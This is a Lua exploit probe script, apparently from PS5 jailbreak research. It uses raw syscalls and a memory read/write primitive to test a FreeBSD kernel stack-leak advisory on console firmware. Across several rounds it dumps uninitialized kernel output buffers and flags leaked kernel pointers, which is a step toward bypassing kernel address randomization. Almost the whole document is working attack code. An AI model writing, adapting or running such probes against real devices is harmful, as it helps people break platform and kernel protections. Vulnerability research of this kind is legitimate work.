-- CRASH_CLASS: LOW
-- PROBE 1407a: SA-26:51 ktimer CLOCK_TAI uninitialized stack leak
--
-- Context: FreeBSD SA-26:51 (2026-07-29) — timer_settime with CLOCK_TAI
-- copies uninitialized kernel stack data to userland via the old_value
-- output parameter. This is because the CLOCK_TAI path in kern_timer_settime
-- doesn't initialize the output itimerspec before the copyout.
--
-- PS5 14.10 build: Sep 28 2026. SA announced Jul 29 2026.
-- Sony MAY have patched. This probe tests empirically.
--
-- Syscalls: ktimer_create=235, ktimer_delete=236, ktimer_settime=237,
--           ktimer_gettime=238
-- CLOCK_TAI = 10 (FreeBSD), CLOCK_REALTIME = 0, CLOCK_MONOTONIC = 4
--
-- prior art: no prior ktimer probes in this repository

print("=== PROBE 1407a: ktimer CLOCK_TAI info leak ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local sc_timer_create = make_syscall(235)
local sc_timer_delete = make_syscall(236)
local sc_timer_settime = make_syscall(237)
local sc_timer_gettime = make_syscall(238)

-- Constants
local CLOCK_REALTIME = 0
local CLOCK_MONOTONIC = 4
local CLOCK_TAI = 10  -- FreeBSD CLOCK_TAI

-- struct itimerspec = { struct timespec it_interval; struct timespec it_value; }
-- struct timespec = { time_t tv_sec (8B); long tv_nsec (8B); }
-- sizeof(itimerspec) = 32 bytes

print("== Section A: timer_create availability ==")

-- Try creating a timer with CLOCK_REALTIME first (baseline)
local timerid_buf = memory.alloc(8)
safe_wq(timerid_buf, uint64(0))

local ret_rt = nil
pcall(function()
    ret_rt = sc_timer_create(uint64(CLOCK_REALTIME), uint64(0), uint64(timerid_buf))
end)
print(string.format("timer_create(CLOCK_REALTIME, NULL, &tid): ret=%s", tostring(ret_rt)))

if ret_rt then
    local h, l = get_hi_lo(ret_rt)
    if l == 0 and h == 0 then
        local tid = safe_rd(timerid_buf)
        print(string.format("  timerid = %d", tid or -999))
    end
end

-- Try CLOCK_TAI
local timerid_buf2 = memory.alloc(8)
safe_wq(timerid_buf2, uint64(0))

local ret_tai = nil
pcall(function()
    ret_tai = sc_timer_create(uint64(CLOCK_TAI), uint64(0), uint64(timerid_buf2))
end)
print(string.format("timer_create(CLOCK_TAI, NULL, &tid): ret=%s", tostring(ret_tai)))

local tai_tid = -1
if ret_tai then
    local h, l = get_hi_lo(ret_tai)
    if l == 0 and h == 0 then
        tai_tid = safe_rd(timerid_buf2) or -1
        print(string.format("  CLOCK_TAI timerid = %d", tai_tid))
    else
        print("  timer_create(TAI) returned nonzero — CLOCK_TAI may not be supported")
    end
end

print("")
print("== Section B: timer_settime with old_value (the leak path) ==")

-- The vulnerability: timer_settime(timerid, flags, &new_value, &old_value)
-- When CLOCK_TAI is used, the kernel doesn't initialize old_value before copyout
-- So we get uninitialized kernel stack data

-- First, test with CLOCK_REALTIME timer as baseline
if ret_rt then
    local h_rt, l_rt = get_hi_lo(ret_rt)
    if l_rt == 0 and h_rt == 0 then
        local rt_tid = safe_rd(timerid_buf) or 0

        local new_val = memory.alloc(32)
        -- it_interval = {0, 0}, it_value = {1, 0} (1 second)
        safe_wq(new_val + 0, uint64(0))      -- it_interval.tv_sec
        safe_wq(new_val + 8, uint64(0))      -- it_interval.tv_nsec
        safe_wq(new_val + 16, uint64(1))     -- it_value.tv_sec
        safe_wq(new_val + 24, uint64(0))     -- it_value.tv_nsec

        -- Fill old_value with sentinel pattern
        local old_val = memory.alloc(64)
        for i = 0, 56, 8 do
            safe_wq(old_val + i, uint64("0xDEADBEEFCAFEBABE"))
        end

        local ret_set
        pcall(function()
            ret_set = sc_timer_settime(uint64(rt_tid), uint64(0), uint64(new_val), uint64(old_val))
        end)
        print(string.format("timer_settime(RT tid=%d, 0, new, old): ret=%s", rt_tid, tostring(ret_set)))

        -- Dump old_value
        print("  old_value (REALTIME baseline, should be zeros):")
        for i = 0, 24, 8 do
            local q = safe_rq(old_val + i)
            if q then
                print(string.format("    +0x%02X: %s", i, hex64(q)))
            end
        end

        -- Clean up
        pcall(function() sc_timer_delete(uint64(rt_tid)) end)
    end
end

print("")

-- Now the real test: CLOCK_TAI timer_settime
if tai_tid >= 0 then
    print("== Section C: CLOCK_TAI timer_settime leak test ==")

    -- Run multiple times to see if we get different (non-zero) values
    for round = 1, 5 do
        local new_val = memory.alloc(32)
        safe_wq(new_val + 0, uint64(0))
        safe_wq(new_val + 8, uint64(0))
        safe_wq(new_val + 16, uint64(1))
        safe_wq(new_val + 24, uint64(0))

        -- Fill with different sentinel each round
        local old_val = memory.alloc(64)
        local sentinel = 0xAA000000 + round
        for i = 0, 56, 8 do
            safe_wq(old_val + i, uint64(string.format("0x%08X%08X", sentinel, sentinel)))
        end

        local ret_set
        pcall(function()
            ret_set = sc_timer_settime(uint64(tai_tid), uint64(0), uint64(new_val), uint64(old_val))
        end)
        print(string.format("  Round %d: ret=%s", round, tostring(ret_set)))

        -- Dump all 32 bytes of old_value
        local found_kptr = false
        for i = 0, 24, 8 do
            local q = safe_rq(old_val + i)
            if q then
                local h, l = get_hi_lo(q)
                local is_sentinel = (h == sentinel and l == sentinel)
                local is_zero = (h == 0 and l == 0)
                local is_kptr = (h >= 0xFFFF8000)
                local tag = ""
                if is_sentinel then tag = " [SENTINEL - untouched]"
                elseif is_zero then tag = " [zero]"
                elseif is_kptr then
                    tag = " [*** KERNEL POINTER ***]"
                    found_kptr = true
                elseif h > 0 then tag = " [nonzero!]"
                end
                print(string.format("    +0x%02X: %s%s", i, hex64(q), tag))
            end
        end
        if found_kptr then
            print("  *** KERNEL POINTER FOUND IN UNINITIALIZED STACK DATA ***")
        end
    end

    -- Clean up TAI timer
    pcall(function() sc_timer_delete(uint64(tai_tid)) end)
elseif ret_tai then
    print("CLOCK_TAI timer creation failed — testing timer_settime with REALTIME timer + TAI flag")

    -- Alternative: even without a TAI timer, try calling timer_settime
    -- with TIMER_ABSTIME flag and a REALTIME timer
    local rt_tid2_buf = memory.alloc(8)
    safe_wq(rt_tid2_buf, uint64(0))
    pcall(function()
        sc_timer_create(uint64(CLOCK_REALTIME), uint64(0), uint64(rt_tid2_buf))
    end)
    local rt_tid2 = safe_rd(rt_tid2_buf) or 0

    for round = 1, 3 do
        local new_val = memory.alloc(32)
        safe_wq(new_val + 16, uint64(1))

        local old_val = memory.alloc(64)
        for i = 0, 56, 8 do
            safe_wq(old_val + i, uint64("0xDEADBEEFCAFEBABE"))
        end

        local ret_set
        pcall(function()
            -- TIMER_ABSTIME = 1
            ret_set = sc_timer_settime(uint64(rt_tid2), uint64(1), uint64(new_val), uint64(old_val))
        end)
        print(string.format("  Round %d (ABSTIME): ret=%s", round, tostring(ret_set)))
        for i = 0, 24, 8 do
            local q = safe_rq(old_val + i)
            if q then
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFF8000 then tag = " [*** KERNEL POINTER ***]" end
                print(string.format("    +0x%02X: %s%s", i, hex64(q), tag))
            end
        end
    end
    pcall(function() sc_timer_delete(uint64(rt_tid2)) end)
end

print("")
print("== Section D: timer_gettime (check for similar leak) ==")

-- timer_gettime might also leak on TAI timers
local tid3_buf = memory.alloc(8)
pcall(function()
    sc_timer_create(uint64(CLOCK_REALTIME), uint64(0), uint64(tid3_buf))
end)
local tid3 = safe_rd(tid3_buf) or 0

local gettime_buf = memory.alloc(64)
for i = 0, 56, 8 do
    safe_wq(gettime_buf + i, uint64("0xBBBBBBBBBBBBBBBB"))
end

local ret_get
pcall(function()
    ret_get = sc_timer_gettime(uint64(tid3), uint64(gettime_buf))
end)
print(string.format("timer_gettime(tid=%d): ret=%s", tid3, tostring(ret_get)))
for i = 0, 24, 8 do
    local q = safe_rq(gettime_buf + i)
    if q then
        local h, l = get_hi_lo(q)
        local tag = ""
        if h >= 0xFFFF8000 then tag = " [*** KERNEL POINTER ***]" end
        if h == 0xBBBBBBBB and l == 0xBBBBBBBB then tag = " [SENTINEL]" end
        print(string.format("  +0x%02X: %s%s", i, hex64(q), tag))
    end
end
pcall(function() sc_timer_delete(uint64(tid3)) end)

print("")
print("== Section E: All clock types ==")

-- Test timer_create with every clock type to see what's supported
local clock_names = {
    [0] = "REALTIME", [1] = "VIRTUAL", [4] = "MONOTONIC",
    [5] = "UPTIME", [7] = "REALTIME_PRECISE", [8] = "REALTIME_FAST",
    [9] = "MONOTONIC_PRECISE", [10] = "TAI", [11] = "MONOTONIC_FAST",
    [12] = "SECOND", [13] = "THREAD_CPUTIME"
}

for _, clk in ipairs({0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}) do
    local buf = memory.alloc(8)
    safe_wq(buf, uint64(0))
    local rv
    pcall(function()
        rv = sc_timer_create(uint64(clk), uint64(0), uint64(buf))
    end)
    local h, l = 0, 0
    if rv then h, l = get_hi_lo(rv) end
    local name = clock_names[clk] or "?"
    local tid_val = safe_rd(buf) or -1
    if rv and l == 0 and h == 0 then
        print(string.format("  clock %2d (%s): OK, tid=%d", clk, name, tid_val))
        pcall(function() sc_timer_delete(uint64(tid_val)) end)
    else
        print(string.format("  clock %2d (%s): FAILED (ret=%s)", clk, name, tostring(rv)))
    end
end

print("")
print("=== PROBE 1407a COMPLETE ===")
